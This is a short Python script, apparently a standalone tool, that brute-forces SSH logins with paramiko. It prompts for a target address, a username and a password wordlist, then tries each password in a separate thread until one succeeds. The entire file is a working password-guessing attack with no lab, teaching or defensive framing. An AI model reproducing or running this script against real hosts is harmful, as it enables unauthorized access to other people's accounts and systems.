import paramiko, sys, os, socket, threading, time
from termcolor import colored

stop_flag = 0



def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(colored(f'[+] found password: "{password}" for account "{username}"', 'green'))
    except:
       ssh.close()

host = input(colored('[+] Target address: ', 'blue'))
username = input(colored('[+] ssh username: ', 'blue'))
input_file = input(colored('[+] passwords file: ', 'blue'))

while os.path.exists(input_file) == False:
    print(colored('[!] that file doesnt exist', 'red'))
    input_file = input(colored('[+] "q" to exit; passwords file: ', 'blue'))
    if input_file == 'q':
        sys.exit(1)
    
print(colored(f'---starting bruteforce on {host} with {username}---', 'yellow'))

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag ==1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.4)